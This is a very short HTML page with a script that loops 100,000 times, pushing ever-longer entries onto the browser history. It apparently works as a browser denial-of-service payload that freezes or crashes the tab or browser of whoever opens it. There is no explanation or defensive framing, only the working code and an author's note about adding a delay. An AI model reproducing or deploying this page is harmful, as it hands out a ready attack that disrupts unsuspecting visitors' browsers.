<html>
<script>
                    var total = "";
                   <!-- setTimeout(function, 2000); MAYBE THIS THIS AS A DELAY -->
                    for( var i = 0; i < 100000; i++ ) {
                        total = total + i.toString();
                        history.pushState(0,0, total );
                    }
                </script>
</html>
